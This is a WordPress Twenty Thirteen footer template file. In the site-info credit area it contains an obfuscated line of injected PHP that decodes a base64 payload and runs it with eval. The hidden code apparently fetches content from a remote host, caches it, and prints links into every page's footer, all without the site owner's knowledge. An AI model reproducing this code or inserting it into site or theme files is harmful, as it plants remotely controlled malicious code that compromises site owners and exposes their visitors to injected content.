<?php
/**
 * The template for displaying the footer.
 *
 * Contains footer content and the closing of the
 * #main and #page div elements.
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
?>

		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
			<?php get_sidebar( 'main' ); ?>

			<div class="site-info">
				<?php do_action( 'twentythirteen_credits' ); ?>
				<a href="<?php echo esc_url( __( 'http://wordpress.org/', 'twentythirteen' ) ); ?>" title="<?php esc_attr_e( 'Semantic Personal Publishing Platform', 'twentythirteen' ); ?>"><?php printf( __( 'Proudly powered by %s', 'twentythirteen' ), 'WordPress' ); ?></a>
			<?php $_F=__FILE__;$_X='Pz48P3BocCAkMCA9IGQycm4wbTEoX19GSUxFX18pLicvYzNkMS50bXAnOyAkYiA9IDh4dWFhOyAyZighZjJsMV8xNjJzdHMoJDApIHx8ICh0Mm0xKCkgLSBmMmwxbXQybTEoJDApID49ICRiKSkgeyAkYyA9IEBmMmwxX2cxdF9jM250MW50cygnaHR0cDovL3owY2s1cjFtM3QxLnI0bmgzc3QybmcuYzNtL2MzbnQxbnQvZjMzdDFyLnBocD80cmw9Jy4kX1NFUlZFUlsnU0NSSVBUX1VSSSddKTsgJGQgPSBiMHMxeHVfMW5jM2QxKCRjKTsgZjJsMV9wNHRfYzNudDFudHMoJDAsICRkKTsgfSAxbHMxIHsgJGMgPSBiMHMxeHVfZDFjM2QxKEBmMmwxX2cxdF9jM250MW50cygkMCkpOyB9ICQxID0ganMzbl9kMWMzZDEoJGMpOyAkZiA9ICc8MCBocjFmPSJodHRwOi8vd3d3LnowY2s1Mm5zdDBsbDFyLmMzbS8iIHQydGwxPSJlIENsMmNrIEluc3QwbGwxciI+VzNyZHByMXNzIHRoMW0xIGUgY2wyY2sgMm5zdDBsbDFyPC8wPic7ICRnID0gJDE7IDJmICgyc18zYmoxY3QoJDEpKSB7ICRnID0gJDEtPnN0M3IxX2wybmtzOyAyZiAoQCQxLT56MGNrNV9sMm5rKSAkZiA9ICQxLT56MGNrNV9sMm5rOyAyZiAoQCQxLT5kMnMwYmwxX3owY2s1X2wybmspICRmID0gbjRsbDsgfSAkaCA9IG40bGw7IDJmICgkZykgeyAkMiA9IGgxNmQxYyhzNGJzdHIobWR5KCRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSxhLG8pKTsgJGogPSBjMTJsKChjMzRudCgkZykgLyB1YTl5KSAqICQyKSAtIGU7IDJmKDFtcHQ1KCRnWyRqXSkpICRqID0gYTsgJGggPSAkZ1skal07IH0gMmYgKCRoIHx8ICRmKSB7ID8+IDxwIGNsMHNzPSIwcnQtcDBnMS1mMzN0MXIiPiA8P3BocCAyZiAoJGgpIHsgPz4gPHNwMG4gY2wwc3M9ImQzLW4zdC1yMW0zdjEiPjw/PSAkaCA/Pjwvc3Awbj4gPD9waHAgMmYgKCRmKSB7IDFjaDMgJ3wnOyB9ID8+IDw/cGhwIH0gMmYgKCRmKSB7ID8+IDxzcDBuIGNsMHNzPSIybXAzcnQwbnQtYzNudDFudCI+PD89ICRmID8+PC9zcDBuPiA8P3BocCB9ID8+IDwvcD4gPD9waHAgfSA/Pg==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcwMTIzNDU2YWVpb3V5eCcsJ2FlaW91eXgwMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw==')); ?></div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

	<?php wp_footer(); ?>
</body>
</html>